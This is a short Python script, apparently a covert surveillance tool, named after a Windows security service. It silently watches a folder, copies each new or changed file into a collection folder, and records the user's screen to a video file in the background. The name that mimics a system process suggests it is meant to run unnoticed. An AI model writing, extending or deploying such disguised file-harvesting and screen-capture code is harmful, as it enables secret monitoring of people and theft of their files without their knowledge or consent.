# name: Windows Security Health Service SSH.exe
import json
from threading import Thread
from os import getcwd
from shutil import copy2
from screen import record
from observer import observe, is_file_downloaded

with open('config.json', 'r', encoding='utf-8') as f:
    data = json.loads(f.read())

source = data["source"]
target = data.get("target", getcwd())
exclude = data.get("exclude", [])
exclude += [target]
fps = data.get("fps", 10)
monitor = data.get("monitor", 1)
video_output = target + "/output.avi"

@observe(source)
def on_change(path):
    for ex in exclude:
        if ex in path:
            return
        
    print(path)
    
    try:
        while not is_file_downloaded(path, wait_time=1):
            print(path, "not downloaded yet")
            
        copy2(path, target)
    except Exception as e:
        print(e)

if __name__ == '__main__':
    t = Thread(target=on_change)
    t.start()
    record(video_output, fps, monitor)